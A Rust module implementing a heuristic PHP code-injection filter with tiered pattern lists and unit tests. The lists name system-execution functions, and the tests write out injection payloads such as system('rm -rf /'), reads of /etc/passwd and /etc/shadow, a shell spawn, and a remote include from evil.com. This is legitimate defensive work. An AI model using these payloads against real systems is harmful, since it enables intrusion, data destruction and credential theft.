//! PHP Code Injection Guard.
//!
//! **Heuristic filter, not a WAF.**  Detects substrings associated with
//! PHP injection payloads.  No decoding, no transformation — any simple
//! obfuscation bypasses the match.  For real protection deploy a WAF
//! upstream with OWASP CRS loaded.
//!
//! Patterns are split into paranoia tiers.  PL1 (default) contains only
//! very high-signal attack strings — things no normal user input ever
//! contains verbatim (`eval(`, `system(`, obfuscation chains).  PL2 adds
//! common patterns with moderate FP rate, PL3 is aggressive and WILL
//! fire on legitimate technical content (PHP docs, CTF writeups, code
//! snippet editors).

use aho_corasick::AhoCorasick;

use crate::Verdict;

/// Paranoia-level 1 — very high-signal patterns only.
///
/// These are attack primitives whose appearance in user input has
/// essentially no legitimate explanation for the average application.
/// If your application DOES legitimately accept these strings (admin
/// panel with a PHP eval console, for example), add the route to
/// `SecurityConfig.exclude_paths` rather than weakening the patterns.
const CODE_PATTERNS_PL1: &[&str] = &[
    // Direct code execution
    "eval(",
    "assert(",
    "create_function(",
    // System execution
    "exec(",
    "shell_exec(",
    "system(",
    "passthru(",
    "popen(",
    "proc_open(",
    "pcntl_exec(",
];

/// Patterns that indicate multi-layer obfuscation (always PL1 — highest
/// severity, no legitimate reason for any of these to appear in user input).
const OBFUSCATION_CHAINS: &[&str] = &[
    "base64_decode(base64_decode(",
    "eval(base64_decode(",
    "eval(gzinflate(base64_decode(",
    "assert(base64_decode(",
    "eval(str_rot13(",
];

/// Additional PL2 patterns.  Moderate false-positive rate — some
/// legitimate educational content (CTF write-ups, security blog posts,
/// tutorials) embeds these function names in prose.
const CODE_PATTERNS_PL2: &[&str] = &[
    "call_user_func(",
    "call_user_func_array(",
    "base64_decode(",
    "gzinflate(",
    "gzuncompress(",
    "gzdecode(",
    "str_rot13(",
    "chr(",
    "pack(",
    "`",  // backtick operator
    "$$", // variable variables
    "ReflectionFunction",
];

/// Additional PL3 patterns.  Very aggressive — will fire on PHP docs,
/// tutorials, Stack Overflow mirrors, code snippet editors, bug
/// trackers with stack traces, and any admin panel that displays raw
/// PHP source.  Enable only when the application has no such UI.
const CODE_PATTERNS_PL3: &[&str] = &[
    "include(",
    "include_once(",
    "require(",
    "require_once(",
    "str_replace(",
    "$_GET[",
    "$_POST[",
    "$_REQUEST[",
    "$_COOKIE[",
    "->__construct(",
    "::__callStatic(",
];

pub struct CodeGuard {
    /// Fast filter for basic patterns at the configured paranoia level.
    basic_automaton: AhoCorasick,
    /// Obfuscation chains — always loaded (PL1).
    obfuscation_automaton: AhoCorasick,
}

impl CodeGuard {
    /// Build a guard at paranoia level 1 (default).
    pub fn new() -> Self {
        Self::with_paranoia(1)
    }

    /// Build a guard with patterns appropriate for the given paranoia
    /// level (`0` = no patterns, `1`/`2`/`3` = progressively larger
    /// sets).  Levels `>3` clamp to 3.  Obfuscation chains are always
    /// loaded for any level ≥ 1.
    pub fn with_paranoia(level: u8) -> Self {
        let mut basic: Vec<&str> = Vec::new();
        if level >= 1 {
            basic.extend_from_slice(CODE_PATTERNS_PL1);
        }
        if level >= 2 {
            basic.extend_from_slice(CODE_PATTERNS_PL2);
        }
        if level >= 3 {
            basic.extend_from_slice(CODE_PATTERNS_PL3);
        }
        let basic_automaton = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(&basic)
            .expect("Code patterns are valid");

        let obfs: &[&str] = if level == 0 { &[] } else { OBFUSCATION_CHAINS };
        let obfuscation_automaton = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(obfs)
            .expect("Obfuscation patterns are valid");

        CodeGuard {
            basic_automaton,
            obfuscation_automaton,
        }
    }

    /// Check a string for PHP code injection patterns.
    ///
    /// The cheap Aho-Corasick scan runs first. Obfuscation chain detection
    /// only activates if basic patterns match.
    pub fn check(&self, input: &str) -> Verdict {
        if input.is_empty() || input.len() < 4 {
            return Verdict::Allow;
        }

        // Phase 1: obfuscation chains (highest severity, block immediately).
        if let Some(mat) = self.obfuscation_automaton.find(input) {
            let matched = &input[mat.start()..mat.end()];
            return Verdict::Block(format!("Code injection (obfuscation chain): {matched}"));
        }

        // Phase 2: basic dangerous patterns.
        if let Some(mat) = self.basic_automaton.find(input) {
            let matched = &input[mat.start()..mat.end()];
            return Verdict::Block(format!("Code injection pattern: {matched}"));
        }

        Verdict::Allow
    }
}

impl Default for CodeGuard {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allows_normal_input() {
        let guard = CodeGuard::with_paranoia(3);
        assert_eq!(guard.check("hello world"), Verdict::Allow);
        assert_eq!(guard.check("user@example.com"), Verdict::Allow);
        assert_eq!(guard.check("12345"), Verdict::Allow);
        assert_eq!(guard.check(""), Verdict::Allow);
    }

    #[test]
    fn blocks_eval() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("eval('malicious code')").is_blocked());
    }

    #[test]
    fn blocks_system_exec() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("system('rm -rf /')").is_blocked());
        assert!(guard.check("exec('whoami')").is_blocked());
        assert!(guard.check("shell_exec('cat /etc/passwd')").is_blocked());
    }

    #[test]
    fn blocks_base64_obfuscation() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard
            .check("eval(base64_decode('bWFsaWNpb3Vz'))")
            .is_blocked());
    }

    #[test]
    fn blocks_nested_obfuscation() {
        let guard = CodeGuard::with_paranoia(3);
        let input = "eval(gzinflate(base64_decode('eF4NyoEOgCAQBdC...')))";
        let v = guard.check(input);
        assert!(v.is_blocked());
        assert!(v.reason().unwrap().contains("obfuscation chain"));
    }

    #[test]
    fn blocks_superglobal_access() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("$_GET['cmd']").is_blocked());
        assert!(guard.check("$_POST['data']").is_blocked());
    }

    #[test]
    fn blocks_backtick_operator() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("`whoami`").is_blocked());
    }

    #[test]
    fn blocks_variable_variables() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("$$var").is_blocked());
    }

    #[test]
    fn blocks_case_insensitive() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("EVAL('code')").is_blocked());
        assert!(guard.check("System('cmd')").is_blocked());
    }

    // ─── Additional code-pattern coverage ────────────────────────────────────

    #[test]
    fn blocks_passthru() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("passthru('cat /etc/shadow')").is_blocked());
    }

    #[test]
    fn blocks_popen() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("popen('ls -la', 'r')").is_blocked());
    }

    #[test]
    fn blocks_proc_open() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("proc_open('cmd', [], $pipes)").is_blocked());
    }

    #[test]
    fn blocks_pcntl_exec() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard
            .check("pcntl_exec('/bin/sh', ['-c', 'id'])")
            .is_blocked());
    }

    #[test]
    fn blocks_assert_injection() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("assert('eval(chr(115))')").is_blocked());
    }

    #[test]
    fn blocks_include_injection() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("include('/etc/passwd')").is_blocked());
        assert!(guard
            .check("include_once('/var/www/evil.php')")
            .is_blocked());
    }

    #[test]
    fn blocks_require_injection() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("require('/tmp/shell.php')").is_blocked());
        assert!(guard
            .check("require_once('http://evil.com/code.php')")
            .is_blocked());
    }

    #[test]
    fn blocks_chr_function() {
        let guard = CodeGuard::with_paranoia(3);
        // chr() used to build strings character by character to bypass filters
        assert!(guard
            .check("eval(chr(101).chr(118).chr(97).chr(108))")
            .is_blocked());
    }

    #[test]
    fn blocks_pack_function() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard
            .check("eval(pack('H*', '6d616c6963696f7573'))")
            .is_blocked());
    }

    #[test]
    fn blocks_gzuncompress() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard
            .check("eval(gzuncompress(base64_decode('...')))")
            .is_blocked());
    }

    #[test]
    fn blocks_gzdecode() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard
            .check("eval(gzdecode(base64_decode('...')))")
            .is_blocked());
    }

    #[test]
    fn blocks_str_replace_chain() {
        let guard = CodeGuard::with_paranoia(3);
        // str_replace used to reconstruct forbidden function names
        assert!(guard
            .check("$f=str_replace('x','','xexvxaxl'); $f('code');")
            .is_blocked());
    }

    #[test]
    fn blocks_call_user_func() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("call_user_func('system', 'id')").is_blocked());
        assert!(guard
            .check("call_user_func_array('exec', ['whoami'])")
            .is_blocked());
    }

    #[test]
    fn blocks_create_function() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard
            .check("create_function('','system(\"id\")')")
            .is_blocked());
    }

    #[test]
    fn blocks_reflection_function() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard
            .check("$rf = new ReflectionFunction('system');")
            .is_blocked());
    }

    #[test]
    fn blocks_double_dollar_complex() {
        let guard = CodeGuard::with_paranoia(3);
        // $$func() — call a function named in a variable
        assert!(guard.check("$$func()").is_blocked());
    }

    #[test]
    fn blocks_cookie_injection() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("$_COOKIE['session']").is_blocked());
        assert!(guard.check("$_REQUEST['cmd']").is_blocked());
    }

    #[test]
    fn obfuscation_reason_contains_chain_label() {
        let guard = CodeGuard::with_paranoia(3);
        let v = guard.check("eval(base64_decode('bWFsaWNpb3Vz'))");
        assert!(v.is_blocked());
        let reason = v.reason().expect("blocked must have reason");
        assert!(
            reason.contains("obfuscation chain"),
            "reason should mention 'obfuscation chain', got: {reason}"
        );
    }

    #[test]
    fn basic_pattern_reason_contains_pattern_name() {
        let guard = CodeGuard::with_paranoia(3);
        let v = guard.check("system('whoami')");
        assert!(v.is_blocked());
        let reason = v.reason().expect("blocked must have reason");
        assert!(
            reason.contains("system("),
            "reason should name the matched pattern, got: {reason}"
        );
    }

    #[test]
    fn assert_base64_obfuscation_chain() {
        let guard = CodeGuard::with_paranoia(3);
        let v = guard.check("assert(base64_decode('c3lzdGVtKCd3aG9hbWknKQ=='))");
        assert!(v.is_blocked());
        assert!(v.reason().unwrap().contains("obfuscation chain"));
    }

    #[test]
    fn construct_and_callstatic_blocked() {
        let guard = CodeGuard::with_paranoia(3);
        assert!(guard.check("$obj->__construct('evil')").is_blocked());
        assert!(guard.check("Foo::__callStatic('cmd', ['id'])").is_blocked());
    }
}
